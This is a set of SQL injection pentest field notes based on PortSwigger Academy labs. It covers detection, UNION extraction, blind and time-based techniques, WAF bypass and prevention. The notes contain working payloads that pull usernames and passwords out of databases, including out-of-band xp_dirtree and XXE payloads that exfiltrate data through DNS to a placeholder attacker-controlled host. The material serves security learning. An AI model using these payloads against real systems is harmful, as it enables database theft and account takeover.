# SQL Injection — Pentest Field Notes
**Source:** PortSwigger Web Security Academy  
**Type:** Offensive Security / Web Application Pentesting  
**Topics:** SQLi · Blind · OAST · WAF Bypass  
**Status:** Completed ✓

---

## Attack Decision Tree — Which Technique to Use

| Step | Condition | Technique |
|------|-----------|-----------|
| 1 | Results visible on page? | UNION attack → Section 03 |
| 2 | Page behavior changes (message appears/disappears)? | Blind: Conditional Responses → Section 05 |
| 3 | Page same but 500 errors triggered? | Blind: Conditional Errors + CASE/1/0 → Section 06 |
| 4 | Verbose error messages show data? | CAST() error extraction: `1=CAST((SELECT x FROM y LIMIT 1) AS int)` |
| 5 | Query sync but nothing visible? | Time-based Blind: pg_sleep / SLEEP / WAITFOR → Section 07 |
| 6 | Query fully async, no timing signal? | OAST / DNS exfiltration via Burp Collaborator → Section 08 |
| 7 | Input is XML, WAF blocking? | XML entity encoding + Hackvertor → Section 09 |
| 8 | Registration/profile stores user input? | Second-Order SQLi → Section 10 |

---

## 01 — Core Concept

SQL injection = user input escapes the **DATA zone** and enters the **CODE zone** of a SQL query.  
The database cannot tell the difference between injected SQL code and legitimate user data.

**Vulnerable — string concatenation (Java):**

```java
"SELECT * FROM products WHERE category = '" + input + "'"
// input = Gifts' OR '1'='1
// query becomes: WHERE category = 'Gifts' OR '1'='1'
// returns ALL rows — attack works
```

**Safe — parameterized query (Java):**

```java
PreparedStatement s = conn.prepareStatement(
    "SELECT * FROM products WHERE category = ?"
);
s.setString(1, input);
// input stays as DATA, never CODE
```

**Always check ALL injection points:**

| Injection Point | Examples |
|----------------|---------|
| URL parameters | `?id=1` |
| Cookies | `TrackingId=xyz` |
| JSON body | `{"id": "1"}` |
| XML body | `<storeId>1</storeId>` |
| HTTP headers | `User-Agent`, `Referer`, `X-Forwarded-For` |
| Search fields | any search/filter input |
| Login forms | username and password fields |
| ORDER BY param | sort direction inputs |
| Stock check features | product/store ID fields |
| Any stored input | registration, profile update, saved searches |

---

## 02 — Recon & Detection

**Basic detection payloads — inject one at a time, observe response:**

| Payload | What to Look For | What It Means |
|---------|-----------------|---------------|
| `'` | Error / broken page | Potentially vulnerable |
| `''` | Error disappears | Quote-based injection confirmed |
| `' OR '1'='1` | More rows returned | Boolean injection works |
| `' OR '1'='2` | Fewer / no rows | Confirms conditional logic |
| `' AND 1=1--` | Normal page | Comment syntax works |
| `' AND 1=2--` | Empty / different response | Condition is being evaluated |

> Always test both TRUE and FALSE conditions.  
> Both behave differently → conditional injection confirmed.  
> Both behave the same → try error-based or time-based techniques.

**Identify database from version string:**

| Database | Version Query | Version String Looks Like |
|----------|--------------|--------------------------|
| MySQL | `SELECT @@version` | `8.0.42-0ubuntu0.20.04.1` — contains "ubuntu" |
| PostgreSQL | `SELECT version()` | `PostgreSQL 12.22 (Ubuntu...) on x86_64` |
| Oracle | `SELECT * FROM v$version` | `Oracle Database 11g...` |
| SQL Server | `SELECT @@version` | `Microsoft SQL Server 2016...` |

---

## 03 — UNION Attacks (In-Band — Results Visible on Page)

**Prerequisite:** query results must be visible in the HTTP response.  
**Rule:** both SELECT statements must have the EXACT same number of columns with compatible data types.

### Step 1 — Find Column Count

**Method A — ORDER BY (increment until error):**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← 500 error = 3 columns total

-- In URL format:
?cat=Gifts'+ORDER+BY+1--+
?cat=Gifts'+ORDER+BY+2--+
-- MySQL needs space after -- so use --+
```

**Method B — UNION NULL (add NULLs until no error):**

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   ← empty row appears = correct count

-- Oracle: always needs FROM dual
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
-- NULL fits ALL data types → safest choice
```

### Step 2 — Find Text-Compatible Columns

```sql
-- 3 columns found. Test each position by replacing NULL with 'a':
' UNION SELECT 'a',NULL,NULL--    → 'a' visible on page? → col 1 = TEXT ✓
' UNION SELECT NULL,'a',NULL--    → 500 error?          → col 2 = NUMBER ✗
' UNION SELECT NULL,NULL,'a'--    → 'a' visible on page? → col 3 = TEXT ✓

-- Error message when wrong type:
-- "Conversion failed when converting the varchar value 'a' to int"
```

### Step 3 — Extract Data

```sql
-- One text column available → concatenate:
' UNION SELECT username||'~'||password FROM users--

-- Two text columns available:
' UNION SELECT username,password FROM users--

-- In URL (PostgreSQL/Oracle):
?cat=Gifts'+UNION+SELECT+username||'~'||password+FROM+users--+

-- Result on page:
-- administrator~s3cure
-- wiener~peter
-- carlos~montoya
```

**Concatenation operator by database:**

| Database | Concat Syntax |
|----------|--------------|
| Oracle / PostgreSQL | `a\|\|'~'\|\|b` |
| MySQL | `CONCAT(a,'~',b)` |
| SQL Server | `a+'~'+b` |

**URL encoding reminders:**

| Character | URL Encode |
|-----------|-----------|
| space | `+` |
| `;` | `%3B` |
| `'` | `%27` |
| `#` | `%23` |

---

## 04 — Database Enumeration (When You Don't Know Table Names)

**3-step recon: list tables → find columns → extract data**

```sql
-- STEP 1: List ALL tables (non-Oracle):
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- STEP 1b: Filter to custom tables ONLY (remove system noise):
' UNION SELECT table_name,NULL FROM information_schema.tables
WHERE table_schema='public'--

-- STEP 2: Find columns in your target table:
' UNION SELECT column_name,NULL FROM information_schema.columns
WHERE table_name='users'--

-- STEP 3: Extract the data:
' UNION SELECT username||'~'||password FROM users--
```

> Always use `WHERE table_schema='public'` — without it you get
> hundreds of system tables that make it impossible to spot the real ones.

**Oracle — different system tables:**

```sql
-- Oracle uses all_tables not information_schema:
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_columns WHERE table_name='USERS'--
-- Oracle table names are often UPPERCASE
```

---

## 05 — Blind SQLi: Conditional Responses

**Use when:** page changes behavior based on query result (e.g. "Welcome back" appears/disappears)  
but NO data is returned. Common in tracking cookies.

### Confirm Vulnerability — Test True vs False

```sql
-- TRUE condition → "Welcome back" appears:
TrackingId=xyz' AND '1'='1

-- FALSE condition → "Welcome back" disappears:
TrackingId=xyz' AND '1'='2

-- Behavior differs = blind boolean injection confirmed!
```

### Extract Password Character by Character Using SUBSTRING

```sql
-- SUBSTRING(string, start_position, length)
-- SUBSTRING('hello', 1, 1) → 'h'
-- SUBSTRING('hello', 2, 1) → 'e'

-- Guess first char of administrator's password:
xyz' AND SUBSTRING((SELECT password FROM users
WHERE username='administrator'),1,1) > 'm'--

-- "Welcome back" appears → char is in n-z range
-- No message → char is in a-m range

-- Oracle: use SUBSTR not SUBSTRING
```

### Binary Search Strategy — 5 Requests Per Character (Not 36)

```
Finding character at position 1 (answer is 's'):
  > 'm' → Welcome back → range: n–z
  > 't' → no message   → range: n–t
  > 'q' → Welcome back → range: r–t
  > 's' → no message   → range: r or s
  = 's' → Welcome back → confirmed: char 1 = 's' ✓

Change position number (,1,1) to (,2,1) for next character.
Repeat for all 20 characters to get full password.
```

---

## 06 — Blind SQLi: Conditional Errors

**Use when:** page looks IDENTICAL whether query returns data or not.  
Force database to CRASH (500 error) when condition is TRUE. No crash = condition FALSE.

### The Weapon — CASE + Divide by Zero

```sql
SELECT CASE WHEN (condition is TRUE)
THEN 1/0       ← crashes database → 500 error on page
ELSE 'a'       ← safe             → 200 normal page
END
```

### Full Payloads — Critical Syntax Differences by Database

**MySQL / PostgreSQL / SQL Server:**

```sql
TrackingId=x' AND (SELECT CASE WHEN
(SUBSTRING(password,1,1)='a')
THEN 1/0 ELSE 'a'
END FROM users
WHERE username='administrator')='a'--
```

**Oracle (DIFFERENT structure — read carefully):**

```sql
TrackingId=x'||(SELECT CASE WHEN
(SUBSTR(password,1,1)='a')
THEN TO_CHAR(1/0) ELSE ''
END FROM users
WHERE username='administrator')||'
```

> Oracle gotchas:
> 1. Use `||` concatenation style NOT `AND='a'` style
> 2. Use `TO_CHAR(1/0)` not raw `1/0`
> 3. Use `SUBSTR` not `SUBSTRING`
> 4. End with `||'` to close properly
> Forgetting any one of these = always 500 error on both true and false

### Burp Intruder Setup (Sniper) — Character Guessing

```
1. Send to Intruder → Attack type: Sniper
2. Positions tab → mark ONLY the test character: ='§a§'
   Change position number manually each run
3. Payloads → Simple list → add:
   a b c d e f g h i j k l m n o p q r s t u v w x y z
   0 1 2 3 4 5 6 7 8 9
4. Settings → Grep Match → add "Internal Server Error"
   Creates a checkbox column in results
5. Run attack → row with 500 status = correct character
   Change SUBSTR position 1→2→3... repeat 20 times
```

---

## 07 — Blind SQLi: Time-Based

**Use when:** query runs in a separate async thread. Page always returns 200.  
No errors shown. No behavioral change.  
The ONLY signal = how long the response takes.

### Sleep Syntax by Database

| Database | Syntax | Notes |
|----------|--------|-------|
| PostgreSQL | `SELECT pg_sleep(10)` | Most common in PortSwigger labs |
| MySQL | `SELECT SLEEP(10)` | SLEEP() is a function |
| SQL Server | `WAITFOR DELAY '0:0:10'` | hours:minutes:seconds format |
| Oracle | `dbms_pipe.receive_message('a',10) FROM dual` | Complex — rarely tested |

### Confirm + Full Payload (PostgreSQL — Most Common)

```sql
-- Step 1: Confirm time-based works:
TrackingId=x';SELECT pg_sleep(10)--;
-- 10 second delay → vulnerable ✓
-- Instant response → not this DB or not injectable here

-- Step 2: Conditional delay payload:
TrackingId=x';SELECT CASE WHEN
(SUBSTRING(password,1,1)='a')
THEN pg_sleep(10)
ELSE pg_sleep(0)
END FROM users
WHERE username='administrator'--;

-- ~10000ms response = correct character ✓
-- ~100ms response  = wrong character ✗

-- Find password length first:
TrackingId=x';SELECT CASE WHEN
(LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0)
END FROM users WHERE username='administrator'--;
```

> In Burp Repeater: type `;` directly — Burp encodes it automatically.  
> In URL/cookie outside Burp: encode `;` as `%3B`.  
> Use `pg_sleep(3)` instead of 10 for faster testing — still obvious vs ~100ms normal.

### Reading Time Results in Intruder (No Burp Pro Needed)

```
Intruder results → Columns button → enable "Response received" column
Sort by that column descending
Row showing ~10000ms (or ~3000ms if using sleep(3)) = correct character

Cluster bomb:
  Payload 1 = Numbers 1-20 (positions)
  Payload 2 = a-z + 0-9 (characters)
  720 total requests

Binary search in Repeater = ~140 requests = 5x faster
```

---

## 08 — OAST: Out-of-Band Techniques

**Use when:** query is fully async, no errors, no timing signal.  
Make the DATABASE reach out to YOUR server directly.

```
You → App → Database → YOUR SERVER (Collaborator)
Database makes a DNS or HTTP request to a domain YOU control.
Your Collaborator server receives it and notifies you.
```

### Why DNS — Firewall Bypass

| Protocol | Firewall Status |
|----------|----------------|
| HTTP outbound | Often blocked by corporate/cloud firewalls |
| DNS traffic | Almost NEVER blocked — essential for internet operation |

### OAST Payloads by Database

**Oracle (XML + XXE — most common in PortSwigger):**

```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0"
encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote
SYSTEM "http://YOUR-COLLABORATOR/"> %remote;]>'),'/l')
+FROM+dual--
```

**SQL Server:**

```sql
'; exec master..xp_dirtree '//YOUR-COLLABORATOR/a'--
```

**Data exfiltration via DNS hostname:**

```sql
'; exec master..xp_dirtree
'//'+(SELECT password FROM users)+'.YOUR-COLLABORATOR/a'--

-- Collaborator receives a DNS lookup for:
-- secretpassword123.abc.burpcollaborator.net
-- Password is INSIDE the domain name!
```

> Burp Collaborator = Burp Pro only feature.  
> PortSwigger labs firewall blocks all other OAST servers (interactsh, etc).  
> These labs require Burp Pro.  
> Free alternative for real engagements: interactsh.com

---

## 09 — WAF Bypass: XML Injection

**Use when:** app accepts XML input (API body, stock check, SOAP).  
WAF blocks obvious SQLi keywords like UNION, SELECT.  
Encode keywords as XML entities — WAF checks BEFORE server decodes, server decodes AFTER.

### How the Bypass Works

```
Your encoded payload
    → WAF reads it (sees gibberish) → PASSES ✓
    → Server XML-decodes entities
    → SQL executes → ATTACK WORKS
```

### Hackvertor Method — Recommended (Encodes EVERYTHING)

```xml
<storeId>
  <@hex_entities>
    1 UNION SELECT username||'~'||password FROM users
  </@hex_entities>
</storeId>
```

> Hackvertor encodes EVERY character including spaces, pipes, quotes.  
> Manual partial encoding (just UNION, SELECT) = still detected.  
> Full encoding of everything = bypass ✓

**Install Hackvertor:**  
Burp Suite → Extensions → BApp Store → search "Hackvertor" → Install  
In Repeater: select payload text → right-click → Extensions → Hackvertor → Encode → hex_entities

### Full Lab Workflow

```
1. Intercept stock check POST request in Burp
   Body is XML with productId and storeId

2. Test math in storeId:
   <storeId>1+1</storeId>
   → returns stock for store 2 = SQL evaluates input ✓

3. Try UNION SELECT NULL--
   → 403 "Attack detected" = WAF is active

4. Wrap full payload in <@hex_entities>...</@hex_entities>
   → 200 OK = WAF bypassed ✓

5. Query returns single column
   → use username||'~'||password concatenation to get all data in one column
```

---

## 10 — Second-Order SQL Injection

**The most dangerous SQLi to miss in code review.**  
Input is stored SAFELY today, then used UNSAFELY later.  
Developer sanitizes on entry but trusts stored data on retrieval.  
**Both steps need parameterization.**

### Attack Flow

```
Register: admin'--
  → Stored safely in DB ✓
  → App retrieves username later
  → "It's from our DB, it's trusted!" ← WRONG
  → Injected unsafely into query 💀
```

**Day 1 — Registration (safe):**

```sql
-- username: admin'--  stored with proper escaping:
INSERT INTO users VALUES ('admin''--', 'mypassword')
-- No injection here ✓
-- Scanner marks this as clean ✓
```

**Day 2 — Password change (unsafe):**

```sql
-- App retrieves username from DB
-- Developer thinks: "from our DB = safe"
UPDATE users SET password='x'
WHERE username='admin'--'
-- Changes ADMIN's password! 💀
-- -- comments out the rest of the query
```

### Where to Hunt for Second-Order SQLi During Pentest

- Username / display name at registration
- Profile update features
- Password reset flow
- Email / phone change features
- Saved search queries
- Address book / contacts
- Any field that is stored and later retrieved into a query

---

## 11 — Prevention

### Parameterized Queries — All Languages

| Language | Vulnerable ❌ | Safe ✓ |
|----------|-------------|--------|
| Python | `"WHERE user='"+u+"'"` | `cursor.execute("WHERE user=%s",(u,))` |
| PHP | `"WHERE user='$u'"` | `$stmt->execute([$u])` |
| Node.js | `"WHERE user='"+u+"'"` | `db.query("WHERE user=?",[u])` |
| Java | `"WHERE user='"+u+"'"` | `stmt.setString(1,u)` |

### What Parameterization CANNOT Protect — Use Whitelist Instead

```sql
-- CANNOT parameterize table/column names or ORDER BY:
SELECT * FROM ? ORDER BY ?   ← DOES NOT WORK
```

```java
// Solution: explicit whitelist validation
if (col.equals("name") || col.equals("price") || col.equals("date")) {
    // safe to use in query
} else {
    throw new Exception("Invalid column: " + col);
}
```

### Golden Rules Checklist — For Pentest Reports

| # | Rule |
|---|------|
| 1 | Always use parameterized queries / prepared statements — NEVER concatenate user input into SQL |
| 2 | Never trust data from your own database — parameterize when retrieving stored data too (prevents 2nd order) |
| 3 | Whitelist for table/column names and ORDER BY — never pass from user input directly |
| 4 | No case-by-case decisions — never skip parameterization because "this input seems safe" |
| 5 | Use an ORM (Hibernate, Django ORM, Eloquent, Sequelize) — handles parameterization automatically |
| 6 | Principle of least privilege — DB user should only have SELECT on what it needs, no DROP/xp_cmdshell |

---

## 12 — Database Syntax Cheat Sheet

| Feature | MySQL | PostgreSQL | Oracle | SQL Server |
|---------|-------|-----------|--------|-----------|
| Comment | `--` or `#` | `--` | `--` | `--` |
| UNION NULL | `UNION SELECT NULL--` | `UNION SELECT NULL--` | `UNION SELECT NULL FROM dual--` | `UNION SELECT NULL--` |
| Substring | `SUBSTRING(x,1,1)` | `SUBSTRING(x,1,1)` | `SUBSTR(x,1,1)` | `SUBSTRING(x,1,1)` |
| Concat | `CONCAT(a,'~',b)` | `a\|\|'~'\|\|b` | `a\|\|'~'\|\|b` | `a+'~'+b` |
| Version | `@@version` | `version()` | `SELECT * FROM v$version` | `@@version` |
| Sleep | `SLEEP(10)` | `pg_sleep(10)` | `dbms_pipe.receive_message('a',10)` | `WAITFOR DELAY '0:0:10'` |
| Row limit | `LIMIT 1` | `LIMIT 1` | `WHERE ROWNUM=1` | `TOP 1` |
| Error crash | `1/0` | `1/0` | `TO_CHAR(1/0)` | `1/0` |
| Tables list | `information_schema.tables` | `information_schema.tables` | `all_tables` | `information_schema.tables` |
| Columns list | `information_schema.columns` | `information_schema.columns` | `all_columns` | `information_schema.columns` |

---

## Common Mistakes That Burn Time in Labs

| Mistake | Fix |
|---------|-----|
| MySQL: `--` not working | Add space after: `-- ` or use `#` or `--+` in URLs |
| Oracle: payload always 500 | Switch from `AND` style to `\|\|` concatenation style |
| Oracle: `1/0` not crashing | Wrap with `TO_CHAR(1/0)` |
| Oracle: SUBSTRING error | Oracle uses `SUBSTR` not `SUBSTRING` |
| Payload cut off at char 95 | Shorten TrackingId to just `x` before your injection |
| UNION returns wrong data | Column count wrong or text column not identified — re-test with NULL method |
| `information_schema` returns too many tables | Add `WHERE table_schema='public'` |
| CAST() gives "more than one row" error | Add `LIMIT 1` to subquery |
| Partial WAF encoding still blocked | Encode EVERYTHING with Hackvertor `<@hex_entities>` not just keywords |

---

*SQL Injection Pentest Field Notes — update as knowledge grows*
